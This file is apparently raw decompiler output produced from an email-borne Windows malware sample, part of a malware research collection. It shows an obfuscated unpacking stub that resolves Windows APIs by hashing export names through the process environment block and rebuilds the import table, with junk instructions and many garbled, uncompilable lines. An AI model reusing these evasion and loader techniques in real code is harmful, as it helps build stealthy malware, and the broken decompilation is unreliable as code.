/*	This file was automatically created by
 *	Reverse Engineering Compiler 1.6 (C) Giampiero Caprino (Mar 31 2002)
 *	Input file: './malware_via_email/malware_1496/ia32_pe/subject.exe'
 */

/* DEST BLOCK NOT FOUND: 00401041 -> 00400fcc */
/*	Procedure: 0x0040102C - 0x00401064
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L0040102C()
{



    asm("enter 0x17,0xf8");
    *eax = *eax + al;
    *eax = *eax & dl;
L00401034:
    eax = eax + 1;
    *eax = *eax + al;
    asm("lodsd");
    asm("out dx,al");
    (restore)ds;
    if(esp = esp - 1) {
        goto L00401034;
    }
    *eax = *eax + al;
    if(ah = ah + al) {
        goto L00400fcc;
    }
    ecx = ecx + 1;
    asm("xchg ebp,[edi+0x53]");
    (restore)esi;
    asm("pushf");
    asm("clc");
    asm("popf");
    edi = 4194304;
    ecx = 151552;
    asm("rep movsb");
    asm("pushf");
    asm("cld");
    asm("popf");
    (save)4260621;
    asm("pushf");
    asm("cmc");
    asm("popf");
    return(0);
}

/*	Procedure: 0x00401065 - 0x0040107B
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L00401065()
{



    (restore)edx;
    asm("xchg eax,ebp");
    *ebp = *ebp + bh;
    *(esi + 12288) = *(esi + 12288) + bh;
    *eax = *eax + al;
    ebp = *(eax + eax + 6);
    *eax = *eax + al;
    (fsave)(frestore) + *(eax + *eax);
}

/* DEST BLOCK NOT FOUND: 0040137f -> 00401419 */
/*	Procedure: 0x0040107C - 0x004013E8
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

__entry_point__()
{



    ecx = ecx + *esp;
    esi = -112;
    edi = edi + eax;
    ecx = 721405384;
    asm("rol ecx,0x1");
    asm("ror edx,0x15");
    edi = esp;
    edx = -33554431;
    asm("rol edx,0x7");
    eax = eax - ebx;
    edi = edi & edx;
    edx = 155616;
    asm("rol edx,0x3");
    edx = edx + edi;
    asm("Unknown opcode 0xc1");
    asm("int1");
    asm("adc [ebx+0x40daf702],ecx");
L004010b0:
    edi = ~edi;
    if(*%ss:eax] != esi) {
        asm("ror edx,0xd");
        if(*%ss:eax] != ecx) {
            edx = edx + -1439227201;
            goto L004010b0;
        }
        eax = eax - 1;
        edx = 18432;
        asm("ror edx,0x7");
        if(*eax != dl) {
            edx = edx ^ edi;
        }
    } else {
        eax = eax - -4;
        edx = -2147483521;
        for(asm("rol edx,0x1");; *eax != dl; edx = edx & ebp) {
        }
    }
    asm("ror si,0xc");
    edi = *esp;
    asm("Unknown opcode 0xc1");
    asm("int1");
    asm("sbb [edi+0x5e],edx");
L004010fd:
    esi = esi - 1;
    edi = 402653190;
    asm("rol edi,0x5");
    ax = ax | 83;
    if(*%ss:esi] != edi) {
        ecx = ecx + ebx;
        goto L004010fd;
    }
    asm("Unknown opcode 0xc1");
    asm("Unknown opcode 0xf7");
    edi :: 0;
    asm("salc");
    dx = dx + 75;
    edi = 48;
    eax = eax ^ edx;
    ecx = *%fs:edi];
    esi = esi & ebx;
    eax = *(ecx + 12);
    asm("rol esi,0x12");
    dx = dx + -21;
    eax = eax + 28;
    edi = edi + *esp;
    edx = *eax;
    eax = eax ^ ebx;
    edi = *edx;
    edx = ~edx;
    esi = *(edi + 8);
    ecx = 29;
    edx = edx + ebp & 940782832;
    eax = L00401437(esi, -829351492);
    ecx = ecx >> 29;
    (save)108;
    (save)1818504812;
    esi = 1818505028;
    eax = 1818522734;
    (save)1818522734;
    asm("Unknown opcode 0xc1");
    asm("repne or dl,[edi+edi*8-0x29]");
    esp = esp + 12;
    ecx = ecx + 1673192248;
    eax = L00401437(eax, -1142172828);
    ecx = edi;
    esi = 0;
    (save)0;
    edx = 0;
    (save)0;
    (save)0;
    (save)12646932;
    (save)-1318322298;
    (save)2287;
    eax = *ecx();
    asm("Unknown opcode 0xc1");
    asm("lock add eax,0x8efba");
    *(edi - 114) = *(edi - 114) + cl;
    (fsave)(frestore) - *(esi - 63);
    asm("Unknown opcode 0xc7");
    edi = edi | *(ecx + 2842311);
    esi = esi - edx;
    eax = *ecx;
    esi = esi - -2002049408;
    *eax() :: *edi;
    asm("Unknown opcode 0xff");
    asm("Unknown opcode 0xff");
    edx = 35;
    ecx = ecx + 1;
    ds = 35;
    esi = esi + 416330615;
    edx = 48;
    asm("ror di,0xa");
    ecx = *%fs:edx];
    eax = eax >> 9;
    edi = *(ecx + 12);
    ax = ax | -56;
    esi = *(edi + 28);
    edi = edi >> 30;
    edx = *esi;
    asm("Unknown opcode 0xc1");
    *ebx & 185;
    *eax = *eax | al;
    *eax = *eax + al;
    edi = !edi;
    edx = edx + ecx;
    asm("Unknown opcode 0xc1");
    asm("int1");
    ecx = ecx | *(ebx + -1031576062);
    if(!(eax = eax + 1833494401)) {
        ebp = eax;
        eax = L00401437(eax, -638293428);
        (save)152496;
        (save)64;
        eax = *edi();
        ebx = eax;
        *(eax - -151563) = ebp;
        L00401437(ebp, -829351492);
        *(ebx - -151573) = edi;
        L00401437(ebp, 1585184409);
        esi = ebx - -151590;
        *esi = edi;
        eax = L00401437(ebp, 852862954);
        (save)esp - 114;
        esi = 64;
        (save)64;
        eax = 4194304;
        esi = *L0040003C + 4194304;
        (save) *(esi + 80);
    }
    (save)4194304;
    eax = *edi();
    asm("pushf");
    asm("cld");
    asm("popf");
    esi = 0x40106c;
    edi = *L0040106C;
    edx = 0;
    asm("pushf");
    asm("cmc");
    asm("popf");
    ecx = 47648;
    esi = 4194567;
    asm("pushf");
    asm("clc");
    asm("popf");
    esi = esi + edi;
    asm("pushf");
    asm("clc");
    asm("popf");
    dl = *esi;
    asm("pushf");
    asm("popf");
    if(edx != 0) {
        asm("pushf");
        asm("stc");
        asm("popf");
        if((dl ^ 76) != 0) {
            *esi = dl;
            asm("pushf");
            asm("stc");
            asm("popf");
        }
        asm("pushf");
        asm("wait");
        asm("popf");
    }
    esi = esi + 1;
    asm("pushf");
    asm("clc");
    asm("popf");
    asm("loop 0x4012c8");
    asm("pushf");
    asm("wait");
    asm("popf");
    asm("pusha");
    edi = ebx;
    eax = 0x40106c;
    asm("pushf");
    asm("stc");
    asm("popf");
    esi = *eax + 4194567;
    asm("cld");
    dl = 128;
    asm("pushf");
    asm("clc");
    asm("popf");
    ebx = 0;
L00401309:
    *edi = *esi;
    edi = edi + 1;
    asm("pushf");
    asm("clc");
    asm("popf");
    bl = 2;
L0040130f:
    L004013E9();
    if(esi = esi + 1) {
        goto L00401309;
    }
    ecx = 0;
    L004013E9();
    >= ? L00401361 : ;
    eax = 0;
    eax = L004013E9();
    >= ? L00401378 : ;
    bl = 2;
    al = 16;
L00401339:
    asm("wait");
    eax = L004013E9();
    asm("pushf");
    asm("wait");
    asm("popf");
    asm("adc al,al");
    asm("fnop");
    asm("wait");
    if(ecx = ecx + 1) {
        goto L00401339;
    }
    != ? 0x4013d3 : ;
    asm("fnop");
    asm("wait");
    *edi = al;
    edi = edi + 1;
    asm("fnop");
    asm("wait");
    goto L0040130f;
    eax = L00401402();
    if(!(ecx = ecx - ebx)) {
        L004013FA();
        goto L004013c9;
        al = *esi;
        asm("pushf");
        asm("cmc");
        asm("popf");
        eax = eax >> 1;
        if(esi = esi + 1) {
            goto L00401419;
        }
        asm("pushf");
        asm("clc");
        asm("popf");
        asm("adc ecx,ecx");
    } else {
        asm("xchg ecx,eax");
        eax = eax - 1 << 8;
        al = *esi;
        esi = esi + 1;
        eax = L004013FA();
        asm("pushf");
        asm("clc");
        asm("popf");
        if(eax < 32000) {
            if(ah >= 5) {
                goto L004013c6;
            }
            asm("pushf");
            asm("cld");
            asm("popf");
            if(eax > 127) {
                goto L004013c7;
            }
        }
    }
    asm("pushf");
    asm("stc");
    asm("popf");
    ecx = ecx + 1;
L004013c6:
    ecx = ecx + 1;
L004013c7:
    asm("xchg ebp,eax");
L004013c9:
    asm("pushf");
    asm("cmc");
    asm("popf");
    eax = ebp;
    asm("pushf");
    asm("popf");
    bl = 1;
    (save)esi;
    esi = edi;
    asm("pushf");
    asm("stc");
    asm("popf");
    esi = esi - eax;
    asm("rep movsb");
    asm("pushf");
    asm("stc");
    asm("popf");
    (restore)esi;
    asm("pushf");
    asm("stc");
    asm("popf");
    goto L0040130f;
}

/* DEST BLOCK NOT FOUND: 004013ee -> 004013f9 */
/*	Procedure: 0x004013E9 - 0x004013F9
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L004013E9()
{



    asm("pushf");
    asm("cld");
    asm("popf");
    if(!(dl = dl + dl)) {
        dl = *esi;
        esi = esi + 1;
        asm("adc dl,dl");
    }
}

/*	Procedure: 0x004013FA - 0x00401401
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L004013FA()
{



    asm("pushf");
    asm("stc");
    asm("popf");
    ecx = 0;
    asm("pushf");
    asm("popf");
}

stack space not deallocated on return
/*	Procedure: 0x00401402 - 0x00401436
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L00401402()
{



    asm("pushf");
    asm("clc");
    asm("popf");
    do {
        L004013E9();
        asm("adc ecx,ecx");
        eax = L004013E9();
    } while(ecx = ecx + 1);
    return;
    asm("pushf");
    asm("clc");
    asm("popf");
    asm("popa");
    eax = L004014E6();
    esi = 0x401046;
    (save)151552 + ebx;
    ecx = 31;
    asm("rep movsb");
}

/*	Procedure: 0x00401437 - 0x004014E5
 *	Argument size: 8
 *	Local size: 0
 *	Save regs size: 16
 */

L00401437(A14, A18)
/* unknown */ void  A14;
/* unknown */ void  A18;
{
	/* unknown */ void  eax;
	/* unknown */ void  ecx;
	/* unknown */ void  edx;
	/* unknown */ void  esi;
	/* unknown */ void  Vfffffffc;



    edx = edx + ecx;
    eax = A14;
    esi = eax;
    ecx = ecx + ebp;
    eax = eax - -114 + -54;
    edx = edx - 1;
    ecx = *eax;
    edx = *(esi - -19 - -101 + ecx) + 1 + 27 + esi;
    edi = *edx + esi;
    edx = edx + 4;
    ecx = *edx + esi;
    (save) *(edx - -4) + esi;
    (save)edi;
    (save)ecx;
    esi = A18;
    edi = ecx;
    (restore)ecx;
    (save)0;
    eax = A14;
    edx = eax;
    eax = eax + *edi;
    for(ecx = 0; 1; ecx = 0) {
        cl = cl + *eax;
        asm("ror ecx,0x8");
        eax = eax + 1;
        ecx = ecx ^ 1265358885;
        if(*eax != 0) {
            continue;
        }
        ecx = ecx ^ esi;
        == ? L004014c3 : ;
        (restore)ecx;
        (save)ecx + 1;
        edi = edi + 4;
        eax = *edi + edx;
    }
    (restore)eax;
    esi = Vfffffffc + (eax << 1);
    ecx = ( *esi & 65535) << 2;
    (restore)esi;
    (save)esi;
    esi = esi + ecx;
    (restore)eax;
    edi = *esi;
    (restore)eax;
    edi = edi + edx;
}

/*	Procedure: 0x004014E6 - 0x00401601
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L004014E6()
{



    asm("pusha");
    edx = ebx;
    ecx = 78624 + edx;
    for(*(ebx + 151607) = edx; 1; ecx = ecx + 20) {
        eax = *(ecx + 12);
        if(eax == 0) {
            break;
        }
        (save)ecx;
        (save)eax;
        esi = *(ecx + 16);
        *(ebx - -151636) = esi;
        edi = *ecx;
        *(ebx - -151618) = edi;
        if(edi == 0) {
            edi = *(ecx - -16);
        }
        edx = *(ebx + 151607);
        *esp = *esp + edx;
        (restore)eax;
        edi = edi + edx;
        *(ebx + 151655) = edi;
        (save) *(ebx + 151655);
        (save)eax;
        esi = *( *(ebx - -151573))();
        for(*(ebx + 151664) = esi; 1; *(ebx + 151655) = esi) {
            esi = *( *(ebx + 151655));
            if(esi == 0) {
                break;
            }
            if(!(esi & -2147483648)) {
                if(!(esi = esi - -2)) {
                    goto L00401580;
                }
                esi = esi + *(ebx + 151607);
            } else {
L00401580:
                esi = esi & 2147483647;
            }
            (save)esi;
            (save) *( *(ebx + 151590))( *(ebx + 151664));
            esi = *(ebx + 151636);
            *(esi + *(ebx + 151607)) = ecx;
            esi = *(ebx + 151636) + 4;
            *(ebx + 151636) = esi;
            esi = *(ebx - -151655) + 4;
        }
        esp = esp - -4;
        (restore)ecx;
    }
    asm("popa");
}

/*	Procedure: 0x00401602 - 0x00000000
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L00401602()
{



}

/* address  size  */
/* 0x0040107c       0 */ /* unknown */ void 	__entry_point__;
#if 0 /* auxiliary information */
# Current option values:
option: +asmflush
option: -compactcalls
option: +compactexprs
option: +compactifs
option: +compset
option: -dfoproc
option: -disasmonly
option: -displaylabels
option: +doblocks
option: +docase
option: +dofor
option: +doifs
option: +dointrinsics
option: +doloops
option: +donullgotos
option: +dopackloops
option: +dopackstmt
option: +doremlabs
option: +dosimplify
option: -dosort
option: +dostmts
option: +doswitch
option: +dowhile
option: -dumpaddrs
option: -dumpcall
option: -dumpcomments
option: -dumpdfo
option: +dumpdoms
option: -dumpsblocks
option: -dumpsets
option: -dumpsizes
option: -dumpstmtid
option: +fatcase
option: -flag16
option: +fullscreen
option: -genpattern
option: -help
option: -hexconst
option: -html
option: +insertlabels
option: -int16
option: +int32
option: -interactive
option: -isvb5
option: +locals
option: -nohtmltabs
option: -nostackoffs
option: -objdump
option: -okclone
option: -outprocs
option: -outrefs
option: -overrule
option: +rdonly
option: -showblocks
option: -showjump
option: -showlabel
option: -showprotosym
option: -showreg
option: -showstring
option: -silent
option: +simplifyexprs
option: -stackalign16
option: -stackalign4
option: -stackalign8
option: -strallregions
option: -traceall
option: -tracesets
option: +types
option: -usesymtab
option: -validatebr
option: -validatereg
option: +validatestr
#endif
